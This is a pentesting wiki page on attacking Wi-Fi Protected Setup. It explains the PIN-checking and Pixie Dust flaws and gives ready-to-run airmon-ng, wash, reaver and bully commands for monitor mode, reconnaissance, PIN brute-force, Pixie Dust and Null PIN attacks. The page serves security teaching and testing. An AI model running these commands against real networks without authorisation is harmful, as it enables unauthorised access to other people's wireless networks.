---
authors: ShutdownRepo, joker2a, blepdoge
category: radio
---

# WPS

## Theory

Wi-Fi Protected Setup (WPS) is a simplified configuration protocol designed to make connecting devices to a secure wireless network easier.
WPS employs an 8-digit PIN for user network connection, verifying the first 4 digits before proceeding to check the remaining 4. This allows for a potential Brute-Force attack on the first set of digits followed by the second set, with a total of only 11,000 possible combinations.

> [!TIP]
> Initially it's 20k possible combinations (10^8 =100.000.000 to 10^4+10^4=20.000) but as the 8th digit of the PIN is always a checksum of digit one to digit seven, there are at most (10^4 +10^3=11.000) attempts needed to find the correct PIN.

Below are some known attacks on Wi-Fi Protected Setup (WPS):

* PIN Brute-Force: Some routers with WPS allow users to connect by entering an 8-digit PIN code. A brute-force attack involves trying all possible combinations until the correct PIN is found.
* Pixie Dust: This attack exploits a weakness in the generation of WPS encryption keys. It involves exploiting vulnerabilities in certain routers during the creation of WPA/WPA2 encryption keys.
* PIN Revelation: Certain WPS-enabled routers may reveal information about the validity of the PIN during a connection attempt. This information disclosure can aid an attacker in narrowing down the search space during a brute-force attack.
* Access Point Enumeration: Some routers with WPS may be vulnerable to an attack that allows an attacker to determine which access points are present in a given area.

## Practice

Most WPS attacks mentioned below can be conducted using [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) (Bash) or [wifite2](https://github.com/derv82/wifite2) (Python).

> [!TIP]
> Monitor mode can be activated automatically with these tools. The [monitor](#monitor-mode) section would not needed then.

> [!CAUTION]
> Some of the commands listed in this section may require high privileges to run. Containers would also need high privileges on a host.


There are three main methods for setting up a connection using WPS:

* Push Button Configuration (PBC): Press the WPS button on the router and then activate the WPS function on the device to connect. The two devices will automatically establish a connection.
* PIN based Configuration: Each WPS-enabled device has a unique PIN code. It can be entered on the router through its web interface, or vice versa, to establish the connection.
* Near Field Communication Configuration: In which the user has to bring the new client close to the access point to allow a near field communication between the devices. NFC Forum–compliant RFID tags can also be used.

### Monitor mode

The default configuration for wireless interfaces is "Managed" mode, restricting packet capture to those with a "Destination MAC" matching the interface's own MAC address.
To capture all packets within a wireless device's range, switch the mode to "Monitor."

::: tabs


=== UNIX-like


The following native commands can be used to have a capable network interface in monitor mode.

```bash
# view wireless interfaces and check their current mode.
iwconfig

# disable a network interface
ifconfig "$INTERFACE" down

# change the interface mode to monitor
iwconfig "$INTERFACE" mode monitor

# re-enable your network interface.
ifconfig "$INTERFACE" up
```


=== Aircrack-ng


With [Aircrack-ng](https://www.aircrack-ng.org/) (C) installed, the following commands can be used.

```bash
# list all your network interfaces.
airmon-ng

# stop interfering network processes
arimon-ng check kill

# start a network interface in monitor mode
airmon-ng start "$INTERFACE"
```



:::


### Recon

[Wash](https://github.com/t6x/reaver-wps-fork-t6x) is used to identify nearby WPS-enabled access points along with their main characteristics. It is included in the [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) (C) package.

```bash
wash -i "$INTERFACE"
```

### PIN Brute-Force

In 2011, researcher [Stefan Viehböck](https://twitter.com/sviehb) identified a design and implementation flaw that made PIN-based WPS vulnerable to brute-force attacks. A successful exploitation of this flaw would grant unauthorized individuals access to the network, and the sole effective solution is to disable WPS.

Two main tools are now available for conducting this attack: [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) (C) and [Bully](https://github.com/aanarchyy/bully) (C).

```bash
# Use 5GHz 802.11 channels (for both tools): -5

# With reaver
# Verbosity of output (for reaver): -v -vv -vvv
reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -vv

# With bully
# Verbosity of output: -v 1 -v 2 -v 3
bully "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -S -F -B -v 3
```

### Pixie Dust

In 2014, [Dominique Bongard](https://twitter.com/Reversity) identified a security vulnerability he dubbed "Pixie Dust". It specifically targets the default WPS implementation found in wireless chips produced by various manufacturers, including Ralink, MediaTek, Realtek, and Broadcom. The attack exploits a randomization deficiency during the generation of the "E-S1" and "E-S2" "secret" nonces. Knowing these nonces, the PIN can be retrieved in a matter of minutes. 

A tool called [pixiewps](https://github.com/wiire-a/pixiewps) was developed, and a new version of [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) was created to automate the attack.

Check [this list](https://docs.google.com/spreadsheets/d/1tSlbqVQ59kGn8hgmwcPTHUECQ3o9YhXR91A_p7Nnj5Y) to know which router model is vulnerable.

```bash
# Use 5GHz 802.11 channels (for both tools): -5

# With reaver
# Verbosity of output (for reaver): -v -vv -vvv
reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -K 1 -N -vv

# With bully
# Verbosity of output: -v 1 -v 2 -v 3
bully "$INTERFACE" -b "$BSSID" -d -v 3
```

### Null Pin

Some poorly implemented systems allowed the use of a "Null" PIN for connections. [Reaver](https://github.com/t6x/reaver-wps-fork-t6x) can conduct the attack, whereas [Bully](https://github.com/aanarchyy/bully) lacks this specific functionality.

```bash
reaver -i "$INTERFACE" -b "$BSSID" -c "$CHANNEL" -f -N -g 1 -vv -p ''
```